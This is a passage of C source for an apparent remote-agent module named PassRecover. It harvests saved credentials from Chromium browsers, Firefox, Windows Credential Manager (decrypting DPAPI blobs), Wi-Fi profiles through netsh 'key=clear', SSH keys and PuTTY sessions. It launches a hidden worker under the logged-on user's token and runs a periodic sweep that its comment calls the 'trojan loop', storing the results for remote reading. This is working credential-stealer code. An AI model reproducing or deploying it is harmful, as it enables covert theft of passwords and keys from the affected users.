        { L"BraveSoftware\\Brave-Browser\\User Data", L"Brave" },
        { L"Vivaldi\\User Data", L"Vivaldi" },
        { L"Chromium\\User Data", L"Chromium" },
        { L"Ungoogled Chromium\\User Data", L"Ungoogled Chromium" },
        { L"Opera Software\\Opera Stable", L"Opera" },
    };
    size_t i;
    if (!PrGetEnvW(L"LOCALAPPDATA", localAppData, MAX_PATH)) { return; }
    for (i = 0; i < (sizeof(chromiumRoots) / sizeof(chromiumRoots[0])); i++)
    {
        wchar_t root[PR_PATH_MAX];
        struct BrowserCtx bc;
        char bname[64];
        PrCombineW(localAppData, chromiumRoots[i][0], root);
        if (!PrFileExistsW(root)) { continue; }
        PrWideToUtf8(chromiumRoots[i][1], bname, (int)sizeof(bname));
        bc.out = out; bc.keyLen = 0; bc.browser = bname;
        PrChromium_HarvestRoot(&bc, root);
    }
}

/* ---------------------------------------------------------------- firefox */

static void PrFirefox_Harvest(PrJson *out)
{
    wchar_t appData[MAX_PATH], base[PR_PATH_MAX], pattern[PR_PATH_MAX];
    WIN32_FIND_DATAW fd;
    HANDLE h;
    if (!PrGetEnvW(L"APPDATA", appData, MAX_PATH)) { return; }
    PrCombineW(appData, L"Mozilla\\Firefox\\Profiles", base);
    PrCombineW(base, L"*", pattern);
    h = FindFirstFileW(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) { return; }
    do
    {
        wchar_t profile[PR_PATH_MAX], lj[PR_PATH_MAX];
        unsigned char *data = NULL;
        unsigned long long len = 0;
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) { continue; }
        if (lstrcmpW(fd.cFileName, L".") == 0 || lstrcmpW(fd.cFileName, L"..") == 0) { continue; }
        PrCombineW(base, fd.cFileName, profile);
        PrCombineW(profile, L"logins.json", lj);
        if (!PrFileExistsW(lj)) { continue; }
        if (!PrReadFileAllW(lj, &data, &len)) { continue; }
        {
            const unsigned char *p = data;
            const unsigned char *end = data + len;
            while (p < end)
            {
                const unsigned char *m = PrMemmem(p, (size_t)(end - p), (const unsigned char*)"hostname", 8);
                char host[256] = "", user[256] = "";
                const unsigned char *q;
                if (m == NULL) { break; }
                p = m;
                q = m + 8;
                while (q < end && *q != '"') { q++; }
                if (q < end) { q++; while (q < end && *q != '"' && strlen(host) < sizeof(host) - 1) { host[strlen(host)] = (char)*q; q++; } }
                {
                    size_t span = (q + 400 < end) ? 400 : (size_t)(end - q);
                    const unsigned char *um = PrMemmem(q, span, (const unsigned char*)"username", 8);
                    if (um != NULL)
                    {
                        const unsigned char *u = um + 8;
                        while (u < end && *u != '"') { u++; }
                        if (u < end) { u++; while (u < end && *u != '"' && strlen(user) < sizeof(user) - 1) { user[strlen(user)] = (char)*u; u++; } }
                    }
                }
                if (host[0] != 0) { PrEmitEntry(out, "browser", "Firefox", host, user, "[encrypted-NSS]", "profile"); }
                p = (q < end) ? q + 1 : end;
            }
        }
        free(data);
    } while (FindNextFileW(h, &fd) != FALSE);
    FindClose(h);
}

/* ------------------------------------------------------- credential manager */

static void PrCredMan_Harvest(PrJson *out)
{
    HMODULE credui;
    PR_CredEnumerateW_fn credEnum;
    LPBYTE *pp = NULL;
    DWORD count = 0;
    int i;
    credui = GetModuleHandleW(L"credui.dll");
    if (credui == NULL) { credui = LoadLibraryW(L"credui.dll"); }
    if (credui == NULL) { return; }
    credEnum = (PR_CredEnumerateW_fn)(void*)GetProcAddress(credui, "CredEnumerateW");
    if (credEnum == NULL) { return; }
    if (credEnum(NULL, CRED_FLAGS_USERNAME_TARGET, &count, pp) == FALSE) { return; }
    if (count > 0 && pp != NULL)
    {
        PR_CREDENTIALW *creds = (PR_CREDENTIALW*)pp;
        for (i = 0; i < (int)count; i++)
        {
            PR_CREDENTIALW *c = &creds[i];
            char target[512] = "", user[512] = "", pw[512] = "";
            PrWideToUtf8(c->TargetName, target, (int)sizeof(target));
            if (c->UserName != NULL) { PrWideToUtf8(c->UserName, user, (int)sizeof(user)); }
            if (c->CredentialBlob != NULL && c->CredentialBlobSize > 0)
            {
                if (c->Type == 1) /* generic: DPAPI-protected */
                {
                    unsigned char *dec = NULL;
                    unsigned long decLen = 0;
                    if (PrDpapiUnprotect(c->CredentialBlob, (unsigned long)c->CredentialBlobSize, &dec, &decLen) && decLen < sizeof(pw))
                    {
                        memcpy(pw, dec, decLen); pw[decLen] = 0;
                        LocalFree(dec);
                    }
                    else { _snprintf_s(pw, sizeof(pw), _TRUNCATE, "[encrypted-%lu]", (unsigned long)c->CredentialBlobSize); }
                }
                else if (c->Type == 2) /* domain_password: already plaintext */
                {
                    unsigned long n = (c->CredentialBlobSize < sizeof(pw) - 1) ? (unsigned long)c->CredentialBlobSize : (unsigned long)(sizeof(pw) - 1);
                    memcpy(pw, c->CredentialBlob, n); pw[n] = 0;
                }
                else
                {
                    _snprintf_s(pw, sizeof(pw), _TRUNCATE, "[type-%lu]", (unsigned long)c->Type);
                }
            }
            else
            {
                _snprintf_s(pw, sizeof(pw), _TRUNCATE, "[no-blob]");
            }
            PrEmitEntry(out, "credman", "Credential Manager", target, user, pw, NULL);
        }
        LocalFree(pp);
    }
}

/* ---------------------------------------------------------------------- wifi */

static void PrRunCapture(const wchar_t *exe, const wchar_t *args, wchar_t *out, int outSize)
{
    SECURITY_ATTRIBUTES sa;
    HANDLE rd, wr, hin, hout;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    wchar_t cmd[1024];

    out[0] = 0;
    sa.nLength = sizeof(sa); sa.lpSecurityDescriptor = NULL; sa.bInheritHandle = TRUE;
    if (CreatePipe(&rd, &wr, &sa, 0) == FALSE) { return; }
    if (CreatePipe(&hin, &hout, &sa, 0) == FALSE) { CloseHandle(rd); CloseHandle(wr); return; }
    _snwprintf_s(cmd, 1024, _TRUNCATE, L"%s %s", exe, args);
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = hin; si.hStdOutput = wr; si.hStdError = wr; si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));
    if (CreateProcessW(exe, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi) == FALSE)
    {
        CloseHandle(hin); CloseHandle(hout); CloseHandle(rd); CloseHandle(wr);
        return;
    }
    CloseHandle(hin); CloseHandle(wr);
    CloseHandle(pi.hThread);
    {
        int off = 0;
        for (;;)
        {
            DWORD got = 0;
            DWORD want = (DWORD)((outSize - 1) - off);
            if (want <= 0) { break; }
            if (ReadFile(rd, out + off, want, &got, NULL) == FALSE || got == 0) { break; }
            off += (int)got;
            out[off] = 0;
        }
    }
    WaitForSingleObject(pi.hProcess, 8000);
    CloseHandle(pi.hProcess);
    CloseHandle(rd);
    CloseHandle(hout);
}

static void PrWifi_Harvest(PrJson *out)
{
    wchar_t list[8192];
    wchar_t *p;
    PrRunCapture(L"netsh", L"wlan show profiles", list, (int)sizeof(list));
    p = list;
    while (p != NULL && *p != 0)
    {
        wchar_t *line = p;
        wchar_t *nl = wcschr(line, L'\n');
        wchar_t *colon;
        wchar_t ssid[128];
        while (*line == L' ' || *line == L'\t' || *line == L'\r' || *line == L'\n') { line++; }
        if (nl != NULL) { *nl = 0; }
        {
            size_t L = wcslen(line);
            while (L > 0 && (line[L - 1] == L'\r' || line[L - 1] == L' ')) { line[--L] = 0; }
        }
        if (wcsstr(line, L"Profile :") != NULL || wcsstr(line, L"Profile:") != NULL)
        {
            colon = wcsstr(line, L":");
            if (colon != NULL)
            {
                colon++;
                while (*colon == L' ' || *colon == L'\t') { colon++; }
                _snwprintf_s(ssid, 128, _TRUNCATE, L"%s", colon);
                {
                    wchar_t cmd[512], detail[4096];
                    char ssidU[256], key[256] = "";
                    _snwprintf_s(cmd, 512, _TRUNCATE, L"wlan show profile name=\"%s\" key=clear", ssid);
                    PrRunCapture(L"netsh", cmd, detail, (int)sizeof(detail));
                    PrWideToUtf8(ssid, ssidU, (int)sizeof(ssidU));
                    {
                        wchar_t *line2 = detail;
                        while (line2 != NULL && *line2 != 0)
                        {
                            wchar_t *nl2 = wcschr(line2, L'\n');
                            size_t L2;
                            if (nl2 != NULL) { *nl2 = 0; }
                            L2 = wcslen(line2);
                            while (L2 > 0 && (line2[L2 - 1] == L'\r' || line2[L2 - 1] == L' ')) { line2[--L2] = 0; }
                            if (wcsstr(line2, L"Key Content") != NULL)
                            {
                                wchar_t *c = wcsstr(line2, L":");
                                if (c != NULL)
                                {
                                    c++;
                                    while (*c == L' ' || *c == L'\t') { c++; }
                                    PrWideToUtf8(c, key, (int)sizeof(key));
                                }
                            }
                            if (nl2 == NULL) { break; }
                            line2 = nl2 + 1;
                        }
                    }
                    if (key[0] != 0) { PrEmitEntry(out, "wifi", "WiFi", ssidU, "", key, "profile"); }
                }
            }
        }
        if (nl == NULL) { break; }
        p = nl + 1;
    }
}

/* --------------------------------------------------------------- ssh / putty */

static void PrSsh_Harvest(PrJson *out)
{
    wchar_t userHome[MAX_PATH], sshDir[PR_PATH_MAX], pattern[PR_PATH_MAX];
    WIN32_FIND_DATAW fd;
    HANDLE h;
    char dirU[PR_PATH_MAX];
    if (!PrGetEnvW(L"USERPROFILE", userHome, MAX_PATH)) { return; }
    PrCombineW(userHome, L".ssh", sshDir);
    PrWideToUtf8(sshDir, dirU, (int)sizeof(dirU));
    PrCombineW(sshDir, L"*", pattern);
    h = FindFirstFileW(pattern, &fd);
    if (h != INVALID_HANDLE_VALUE)
    {
        do
        {
            char name[256];
            if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) { continue; }
            PrWideToUtf8(fd.cFileName, name, (int)sizeof(name));
            PrEmitEntry(out, "ssh", "OpenSSH", dirU, name, "[keyfile]", "key/config/known_hosts inventory");
        } while (FindNextFileW(h, &fd) != FALSE);
        FindClose(h);
    }
    /* PuTTY saved sessions (registry) */
    {
        HKEY base;
        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\SimonTatham\\PuTTY\\Sessions", 0, KEY_READ, &base) == ERROR_SUCCESS)
        {
            DWORD idx = 0;
            for (;;)
            {
                wchar_t sub[64];
                DWORD sz = 64;
                if (RegEnumKeyExW(base, idx, sub, &sz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) { break; }
                {
                    char nameU[128], host[256] = "", user[256] = "";
                    wchar_t full[256], val[256];
                    DWORD t, vsize;
                    PrWideToUtf8(sub, nameU, (int)sizeof(nameU));
                    _snwprintf_s(full, 256, _TRUNCATE, L"Software\\SimonTatham\\PuTTY\\Sessions\\%s", sub);
                    {
                        HKEY hk;
                        if (RegOpenKeyExW(HKEY_CURRENT_USER, full, 0, KEY_READ, &hk) == ERROR_SUCCESS)
                        {
                            vsize = (DWORD)sizeof(val);
                            if (RegQueryValueExW(hk, L"HostName", NULL, &t, (LPBYTE)val, &vsize) == ERROR_SUCCESS) { PrWideToUtf8(val, host, (int)sizeof(host)); }
                            vsize = (DWORD)sizeof(val);
                            if (RegQueryValueExW(hk, L"UserName", NULL, &t, (LPBYTE)val, &vsize) == ERROR_SUCCESS) { PrWideToUtf8(val, user, (int)sizeof(user)); }
                            RegCloseKey(hk);
                        }
                    }
                    PrEmitEntry(out, "ssh", "PuTTY", host, user, "[session]", nameU);
                }
                idx++;
                if (idx > 256) { break; }
            }
            RegCloseKey(base);
        }
    }
}

/* ------------------------------------------------------------- sweep driver */

static void PrDoSweep(PrJson *out)
{
    PrBrowsers_Harvest(out);
    PrFirefox_Harvest(out);
    PrCredMan_Harvest(out);
    PrWifi_Harvest(out);
    PrSsh_Harvest(out);
}

/* ------------------------------------------------------- ring / report file */

static void PrRingAppend(PassRecover *pr, const char *entry)
{
    size_t n = strlen(entry);
    if (n >= PR_ENTRY_MAX) { n = PR_ENTRY_MAX - 1; }
    memcpy(pr->ring[pr->writeIdx % PR_RING].text, entry, n);
    pr->ring[pr->writeIdx % PR_RING].text[n] = 0;
    pr->writeIdx++;
    pr->totalCreds++;
}

static void PrEnsureReport(PassRecover *pr)
{
    char date[16], want[PR_NAME_MAX], path[PR_PATH_MAX];
    PrTodayDate(date, sizeof(date));
    if (pr->report != NULL && strcmp(pr->currentDate, date) == 0) { return; }
    if (pr->report != NULL) { fclose(pr->report); pr->report = NULL; pr->currentSize = 0; }
    _snprintf_s(want, sizeof(want), _TRUNCATE, "passrec-%s.jsonl", date);
    _snprintf_s(path, sizeof(path), _TRUNCATE, "%s\\%s", pr->dir, want);
    pr->report = fopen(path, "a");
    if (pr->report != NULL)
    {
        _snprintf_s(pr->currentFile, sizeof(pr->currentFile), _TRUNCATE, "%s", want);
        _snprintf_s(pr->currentDate, sizeof(pr->currentDate), _TRUNCATE, "%s", date);
        if (fseek(pr->report, 0, SEEK_END) == 0) { pr->currentSize = (unsigned long long)ftell(pr->report); }
    }
}

static void PrReportAppend(PassRecover *pr, const char *entry)
{
    PrEnsureReport(pr);
    if (pr->report == NULL) { return; }
    fputs(entry, pr->report);
    fflush(pr->report);
    pr->currentSize += strlen(entry);
}

/* ------------------------------------------------------------- worker/pipe */

/* Worker (runs in the user session): sweep + write JSONL to the pipe. */
int ILibDuktape_PassRecoverWorker_Run(int argc, char **argv)
{
    PrJson doc;
    HANDLE pipe;
    DWORD written = 0;
    (void)argc; (void)argv;
    PrJson_Init(&doc);
    PrDoSweep(&doc);
    pipe = CreateFileW(PR_PIPE_NAME, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (pipe != INVALID_HANDLE_VALUE)
    {
        if (doc.buf != NULL && doc.len > 0)
        {
            WriteFile(pipe, doc.buf, (DWORD)doc.len, &written, NULL);
        }
        FlushFileBuffers(pipe);
        CloseHandle(pipe);
    }
    PrJson_Free(&doc);
    return 0;
}

/* Agent side: spawn worker, read JSONL, append to out. Returns 1 on success. */
static int PrHarvestViaWorker(PassRecover *pr, PrJson *out)
{
    wchar_t exe[1024];
    wchar_t cmd[1200];
    wchar_t wdir[PR_PATH_MAX];
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    DWORD console;
    HANDLE token = NULL, dup = NULL;
    LPVOID env = NULL;
    SECURITY_ATTRIBUTES sa;
    PSECURITY_DESCRIPTOR sd = NULL;
    HANDLE pipeH = INVALID_HANDLE_VALUE;
    unsigned char *buf;
    int ok = 0;

    PrSetError(pr, "harvest started");
    console = WTSGetActiveConsoleSessionId();
    if (WTSQueryUserToken(console, &token) == FALSE)
    {
        PrSetError(pr, "no interactive user logged on (WTSQueryUserToken)");
        return 0;
    }
    if (DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dup) == FALSE)
    {
        PrSetError(pr, "DuplicateTokenEx failed");
        CloseHandle(token);
        return 0;
    }
    SetTokenInformation(dup, TokenSessionId, &console, sizeof(console));
    /* The worker needs the USER's environment (LOCALAPPDATA, APPDATA,
     * USERPROFILE, PATH), not the service's. Without this the sweep only
     * sees the SYSTEM profile and finds no browser vaults. */
    if (CreateEnvironmentBlock(&env, dup, 0) == FALSE) { env = NULL; }

    ZeroMemory(&sa, sizeof(sa)); sa.nLength = sizeof(sa); sa.bInheritHandle = FALSE;
    if (ConvertStringSecurityDescriptorToSecurityDescriptorA("D:(A;;GRGW;;;WD)(A;;GA;;;SY)(A;;GA;;;BA)", SDDL_REVISION_1, &sd, NULL) == TRUE)
    {
        sa.lpSecurityDescriptor = sd;
    }
    pipeH = CreateNamedPipeW(PR_PIPE_NAME, PIPE_ACCESS_INBOUND | FILE_FLAG_FIRST_PIPE_INSTANCE,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, PR_PIPE_BUF, 0, 0, (sd != NULL) ? &sa : NULL);
    if (sd != NULL) { LocalFree(sd); }
    if (pipeH == INVALID_HANDLE_VALUE)
    {
        PrSetError(pr, "could not create the result pipe");
        goto done;
    }
    if (GetModuleFileNameW(NULL, exe, 1023) <= 0) { goto done; }
    _snwprintf_s(cmd, 1200, _TRUNCATE, L"\"%s\" passrecover-worker", exe);
    PrUtf8ToWide(pr->dir, wdir, (int)(sizeof(wdir) / sizeof(wdir[0])));
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));
    if (CreateProcessAsUserW(dup, exe, cmd, NULL, NULL, FALSE, 0, env, wdir, &si, &pi) == FALSE)
    {
        PrSetError(pr, "could not launch the harvest worker");
        goto done;
    }
    CloseHandle(pi.hThread);

    if (ConnectNamedPipe(pipeH, NULL) == FALSE && GetLastError() != ERROR_PIPE_CONNECTED)
    {
        PrSetError(pr, "the harvest worker did not connect");
        TerminateProcess(pi.hProcess, 0);
        WaitForSingleObject(pi.hProcess, 2000);
        CloseHandle(pi.hProcess);
        goto done;
    }
    {
        size_t total = 0;
        buf = (unsigned char*)malloc(PR_PIPE_BUF);
        if (buf != NULL)
        {
            for (;;)
            {
                DWORD got = 0;
                DWORD want = (DWORD)((PR_PIPE_BUF - 1) - total);
                if (want <= 0) { break; }
                if (ReadFile(pipeH, buf + total, want, &got, NULL) == FALSE) { if (GetLastError() == ERROR_BROKEN_PIPE) { break; } break; }
                if (got == 0) { break; }
                total += got;
            }
            buf[total] = 0;
            PrJson_Append(out, (const char*)buf);
            free(buf);
        }
    }
    WaitForSingleObject(pi.hProcess, PR_WORKER_TIMEOUT_MS);
    CloseHandle(pi.hProcess);
    PrSetError(pr, "harvest complete");
    ok = 1;

done:
    if (env != NULL) { DestroyEnvironmentBlock(env); }
    CloseHandle(pipeH);
    CloseHandle(dup);
    CloseHandle(token);
    return ok;
}

/* --------------------------------------------------------------- JS bridge */

static duk_ret_t PR_GetState(duk_context *ctx)
{
    PassRecover *pr = &g_pr;
    duk_push_object(ctx);
    duk_push_boolean(ctx, pr->available ? 1 : 0);
    duk_put_prop_string(ctx, -2, "available");
    duk_push_boolean(ctx, pr->session0 ? 1 : 0);
    duk_put_prop_string(ctx, -2, "session0");
    duk_push_number(ctx, (double)pr->totalCreds);
    duk_put_prop_string(ctx, -2, "totalCreds");
    duk_push_number(ctx, (double)(pr->writeIdx - pr->readIdx));
    duk_put_prop_string(ctx, -2, "bufferCount");
    duk_push_string(ctx, pr->dir);
    duk_put_prop_string(ctx, -2, "dir");
    duk_push_string(ctx, pr->currentFile);
    duk_put_prop_string(ctx, -2, "currentFile");
    duk_push_number(ctx, (double)pr->lastHarvest);
    duk_put_prop_string(ctx, -2, "lastHarvest");
    duk_push_string(ctx, pr->lastError);
    duk_put_prop_string(ctx, -2, "lastError");
    duk_push_boolean(ctx, pr->autoRunning != 0 ? 1 : 0);
    duk_put_prop_string(ctx, -2, "running");
    duk_push_number(ctx, (double)pr->autoIntervalMin);
    duk_put_prop_string(ctx, -2, "intervalMinutes");
    return 1;
}

/* Run one full sweep (worker or in-process) and append every recovered
 * entry to the ring and the rolling report. Caller holds pr->cs. */
static int PrHarvestOnce(PassRecover *pr, unsigned int *added);

static duk_ret_t PR_Harvest(duk_context *ctx)
{
    PassRecover *pr = &g_pr;
    int ok;
    unsigned int added = 0;

    EnterCriticalSection(&pr->cs);
    ok = PrHarvestOnce(pr, &added);
    LeaveCriticalSection(&pr->cs);

    duk_push_object(ctx);
    duk_push_boolean(ctx, ok ? 1 : 0);
    duk_put_prop_string(ctx, -2, "ok");
    duk_push_number(ctx, (double)added);
    duk_put_prop_string(ctx, -2, "added");
    duk_push_number(ctx, (double)pr->totalCreds);
    duk_put_prop_string(ctx, -2, "total");
    if (!ok)
    {
        duk_push_string(ctx, pr->lastError);
        duk_put_prop_string(ctx, -2, "error");
    }
    return 1;
}

/* Run one full sweep (worker or in-process) and append every recovered
 * entry to the ring and the rolling report. Caller holds pr->cs. */
static int PrHarvestOnce(PassRecover *pr, unsigned int *added)
{
    PrJson doc;
    int ok;
    char *p;

    if (added != NULL) { *added = 0; }
    PrJson_Init(&doc);
    if (pr->session0)
    {
        ok = PrHarvestViaWorker(pr, &doc);
    }
    else
    {
        PrDoSweep(&doc);
        ok = 1;
    }
    if (ok && doc.buf != NULL)
    {
        p = doc.buf;
        while (*p != 0)
        {
            char *nl = strchr(p, '\n');
            size_t n;
            if (nl != NULL) { *nl = 0; }
            n = strlen(p);
            if (n > 0 && p[0] == '{')
            {
                PrRingAppend(pr, p);
                PrReportAppend(pr, p);
                if (added != NULL) { (*added)++; }
            }
            if (nl == NULL) { break; }
            p = nl + 1;
        }
    }
    pr->lastHarvest = time(NULL);
    if (added != NULL) { pr->lastAdded = *added; }
    PrJson_Free(&doc);
    return ok;
}

/* Periodic harvester thread (the "trojan loop"): re-runs the sweep every
 * autoIntervalMin minutes so credentials keep accumulating in the report
 * even when nobody has the web UI open. Runs a sweep immediately on start. */
static DWORD WINAPI PrAutoThreadProc(LPVOID param)
{
    PassRecover *pr = (PassRecover*)param;
    for (;;)
    {
        unsigned int added = 0;
        EnterCriticalSection(&pr->cs);
        PrHarvestOnce(pr, &added);
        LeaveCriticalSection(&pr->cs);
        if (WaitForSingleObject(pr->autoStopEvent, (DWORD)(pr->autoIntervalMin * 60 * 1000)) == WAIT_OBJECT_0)
        {
            break;
        }
    }
    pr->autoRunning = 0;
    return 0;
}

static duk_ret_t PR_Start(duk_context *ctx)
{
    PassRecover *pr = &g_pr;
    unsigned int minutes = 360; /* 6 h default */
    if (duk_is_object(ctx, 0))
    {
        duk_get_prop_string(ctx, 0, "intervalMinutes");
        if (duk_is_number(ctx, -1))
        {
            double m = duk_get_number(ctx, -1);
            if (m >= 1) { minutes = (unsigned int)m; }
        }
        duk_pop(ctx);
    }
    EnterCriticalSection(&pr->cs);
    if (pr->autoRunning == 0)
    {
        pr->autoIntervalMin = minutes;
        pr->autoStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
        if (pr->autoStopEvent == NULL)
        {
            LeaveCriticalSection(&pr->cs);
            return ILibDuktape_Error(ctx, "passrecover.start: could not create the stop event");
        }
        pr->autoThread = CreateThread(NULL, 0, PrAutoThreadProc, pr, 0, NULL);
        if (pr->autoThread == NULL)
        {
            CloseHandle(pr->autoStopEvent);
            pr->autoStopEvent = NULL;
            LeaveCriticalSection(&pr->cs);
            return ILibDuktape_Error(ctx, "passrecover.start: could not start the harvest thread");
        }
        pr->autoRunning = 1;
    }
    LeaveCriticalSection(&pr->cs);
    duk_push_true(ctx);
    return 1;
}

static duk_ret_t PR_Stop(duk_context *ctx)
{
    PassRecover *pr = &g_pr;
    HANDLE thread = NULL;
    (void)ctx;
    EnterCriticalSection(&pr->cs);
    if (pr->autoRunning != 0)
    {
        SetEvent(pr->autoStopEvent);
        thread = pr->autoThread;
        pr->autoThread = NULL;
        CloseHandle(pr->autoStopEvent);
        pr->autoStopEvent = NULL;
    }
    LeaveCriticalSection(&pr->cs);
    if (thread != NULL)
    {
        WaitForSingleObject(thread, 5000);
        CloseHandle(thread);
    }
    duk_push_true(ctx);
    return 1;
}

static duk_ret_t PR_Read(duk_context *ctx)
{
    PassRecover *pr = &g_pr;
    unsigned int max = (duk_is_number(ctx, 0)) ? (unsigned int)duk_get_number(ctx, 0) : 0;
    unsigned long long end = pr->writeIdx;
    unsigned long long i;
    duk_uarridx_t idx = 0;
    duk_push_array(ctx);
    EnterCriticalSection(&pr->cs);
    if (max > 0 && (pr->writeIdx - pr->readIdx) > max) { end = pr->readIdx + max; }
    for (i = pr->readIdx; i < end; i++)
    {
        if (pr->writeIdx - i >= PR_RING) { continue; } /* evicted */
        duk_push_string(ctx, pr->ring[i % PR_RING].text);
        duk_put_prop_index(ctx, -2, idx++);
    }
    pr->readIdx = end;
    LeaveCriticalSection(&pr->cs);
    return 1;
}

static duk_ret_t PR_ListFiles(duk_context *ctx)
{
    PassRecover *pr = &g_pr;
    wchar_t wdir[PR_PATH_MAX], pattern[PR_PATH_MAX];
    WIN32_FIND_DATAW fd;
    HANDLE h;
    unsigned int count = 0;
    duk_push_array(ctx);
    PrUtf8ToWide(pr->dir, wdir, (int)(sizeof(wdir) / sizeof(wdir[0])));
    _snwprintf_s(pattern, PR_PATH_MAX, _TRUNCATE, L"%s\\passrec-*.jsonl", wdir);
    h = FindFirstFileW(pattern, &fd);
    if (h != INVALID_HANDLE_VALUE)
    {
        do
        {
            char name[PR_NAME_MAX];
            ULARGE_INTEGER ftv;
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { continue; }
            PrWideToUtf8(fd.cFileName, name, (int)sizeof(name));
            ftv.LowPart = fd.ftLastWriteTime.dwLowDateTime;
            ftv.HighPart = fd.ftLastWriteTime.dwHighDateTime;
            duk_push_object(ctx);
            duk_push_string(ctx, name);
            duk_put_prop_string(ctx, -2, "name");
            duk_push_number(ctx, (double)fd.nFileSizeHigh * 4294967296.0 + (double)fd.nFileSizeLow);
            duk_put_prop_string(ctx, -2, "size");
            duk_push_number(ctx, (double)ftv.QuadPart);
            duk_put_prop_string(ctx, -2, "mtime");
            duk_put_prop_index(ctx, -2, count);
            count++;
        } while (FindNextFileW(h, &fd) != FALSE);
        FindClose(h);
    }
    _snwprintf_s(pattern, PR_PATH_MAX, _TRUNCATE, L"%s\\passrec-export-*.*", wdir);
    h = FindFirstFileW(pattern, &fd);
    if (h != INVALID_HANDLE_VALUE)
    {
        do
        {
            char name[PR_NAME_MAX];
            ULARGE_INTEGER ftv;
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) { continue; }
            PrWideToUtf8(fd.cFileName, name, (int)sizeof(name));
            ftv.LowPart = fd.ftLastWriteTime.dwLowDateTime;
            ftv.HighPart = fd.ftLastWriteTime.dwHighDateTime;
            duk_push_object(ctx);
            duk_push_string(ctx, name);
            duk_put_prop_string(ctx, -2, "name");
            duk_push_number(ctx, (double)fd.nFileSizeHigh * 4294967296.0 + (double)fd.nFileSizeLow);
            duk_put_prop_string(ctx, -2, "size");
            duk_push_number(ctx, (double)ftv.QuadPart);
            duk_put_prop_string(ctx, -2, "mtime");
            duk_put_prop_index(ctx, -2, count);
            count++;
        } while (FindNextFileW(h, &fd) != FALSE);
        FindClose(h);
    }
    return 1;
}

static duk_ret_t PR_ReadFile(duk_context *ctx)
{
    PassRecover *pr = &g_pr;
    char name[PR_NAME_MAX] = "";
    wchar_t wname[PR_NAME_MAX], path[PR_PATH_MAX];
    long offset, max;
    HANDLE h;
    duk_push_object(ctx);
    if (!duk_is_string(ctx, 0)) { return ILibDuktape_Error(ctx, "passrecover.readFile(name, offset, maxBytes) requires a file name"); }
    {
        size_t sl = 0;
        const char *s = duk_get_lstring(ctx, 0, &sl);
        _snprintf_s(name, sizeof(name), _TRUNCATE, "%s", s);
    }
    if (strlen(name) < 1 || strlen(name) >= sizeof(name)) { return ILibDuktape_Error(ctx, "passrecover.readFile: invalid file name"); }
    if (strchr(name, '/') != NULL || strchr(name, '\\') != NULL) { return ILibDuktape_Error(ctx, "passrecover.readFile: path separators not allowed"); }
    offset = (duk_is_number(ctx, 1)) ? (long)duk_get_number(ctx, 1) : 0;
    max = (duk_is_number(ctx, 2)) ? (long)duk_get_number(ctx, 2) : 65536;
    if (offset < 0) { offset = 0; }
    if (max < 4096) { max = 4096; }
    if (max > 1048576) { max = 1048576; }
    PrUtf8ToWide(name, wname, (int)(sizeof(wname) / sizeof(wname[0])));
    {
        wchar_t wdir[PR_PATH_MAX];
        PrUtf8ToWide(pr->dir, wdir, (int)(sizeof(wdir) / sizeof(wdir[0])));
        _snwprintf_s(path, PR_PATH_MAX, _TRUNCATE, L"%s\\%s", wdir, wname);
        h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    }
    if (h == INVALID_HANDLE_VALUE)
    {
        duk_push_string(ctx, ""); duk_put_prop_string(ctx, -2, "data");
        duk_push_number(ctx, 0.0); duk_put_prop_string(ctx, -2, "size");
        duk_push_number(ctx, 0.0); duk_put_prop_string(ctx, -2, "bytes");
        duk_push_number(ctx, (double)offset); duk_put_prop_string(ctx, -2, "offset");
        duk_push_boolean(ctx, 1); duk_put_prop_string(ctx, -2, "done");
        return 1;
    }
    {
        LARGE_INTEGER sz = { 0 };
        GetFileSizeEx(h, &sz);
        {
            unsigned long long total = (unsigned long long)sz.QuadPart;
            unsigned char *rb = (unsigned char*)malloc((size_t)max + 1);
            char *b64 = (char*)malloc((size_t)max * 2 + 2);
            DWORD got = 0;
            LARGE_INTEGER li;
            unsigned long long doneAt;
            li.QuadPart = offset;
            if (SetFilePointerEx(h, li, NULL, FILE_BEGIN) == FALSE) { got = 0; }
            else { ReadFile(h, rb, (DWORD)max, &got, NULL); }
            doneAt = (unsigned long long)offset + got;
            if (doneAt >= total) { doneAt = total; }
            {
                long bl = PrBase64Encode(rb, (long)got, b64, (long)((size_t)max * 2 + 2));
                if (bl < 0) { b64[0] = 0; }
            }
            duk_push_string(ctx, b64); duk_put_prop_string(ctx, -2, "data");
            duk_push_number(ctx, (double)total); duk_put_prop_string(ctx, -2, "size");
            duk_push_number(ctx, (double)got); duk_put_prop_string(ctx, -2, "bytes");
            duk_push_number(ctx, (double)offset); duk_put_prop_string(ctx, -2, "offset");
            duk_push_boolean(ctx, (doneAt >= total) ? 1 : 0); duk_put_prop_string(ctx, -2, "done");
            free(rb); free(b64);
        }
        CloseHandle(h);
    }
    return 1;
}

/* Render the current JSONL report into csv/json/html and save it. */
static void PrWriteExport(PassRecover *pr, const char *fmt, char *outName, size_t outNameLen, unsigned long long *outSize)
{
    char path[PR_PATH_MAX], stamp[32];
    char line[PR_ENTRY_MAX];
    char f_ts[64], f_src[64], f_app[64], f_org[512], f_user[512], f_pw[512], f_extra[512];
